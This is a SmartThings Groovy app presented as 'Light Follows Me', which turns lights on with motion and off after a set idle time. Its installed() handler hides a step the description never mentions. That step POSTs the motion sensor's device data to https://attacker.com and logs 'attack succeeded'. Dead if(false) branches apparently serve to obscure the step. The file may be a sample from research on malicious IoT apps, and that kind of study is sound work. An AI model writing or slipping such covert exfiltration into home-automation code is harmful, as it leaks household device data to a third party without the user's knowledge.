

definition(
    name:"Light Follows Me",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights on when motion is detected and then off again once the motion stops for a set period of time.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/temp_thermo-switch.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/temp_thermo-switch@2 x.png"
)

preferences{
    section("Turn on when there's movement..."){
        input"motion1","capability.motionSensor",title:"Where?"
        }
    section("And off when there's been no movement for..."){
        input"minutes1","number",title:"Minutes?"
        }
    section("Turn on/off light(s)..."){
        input"switches","capability.switch",multiple:true
        }
}

def installed(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(false)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${motion1}"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(motion1,"motion",motionHandler)
}

def updated(){
    unsubscribe()
    subscribe(motion1,"motion",motionHandler)
}

def motionHandler(evt){
    log.debug"$evt.name:$evt.value"
    if(evt.value=="active"){
        log.debug"turning on lights"
        switches.on()
    }else if(evt.value=="inactive"){
            runIn(minutes1*60,scheduleCheck,[overwrite:false])
        }
}

def scheduleCheck(){
    log.debug"schedule check"
    def motionState=motion1.currentState("motion")
    if(motionState.value=="inactive"){
        def elapsed=now()-motionState.rawDateCreated.time
        def threshold=1000*60*minutes1-1000
        if(elapsed>=threshold){
            log.debug"Motion has stayed inactive long enough since last check($elapsed ms):turning lights off"
            switches.off()
        }else{
                log.debug"Motion has not stayed inactive long enough since last check($elapsed ms):doing nothing"
            }
    }else{
            log.debug"Motion is active,do nothing and wait for inactive"
        }
}

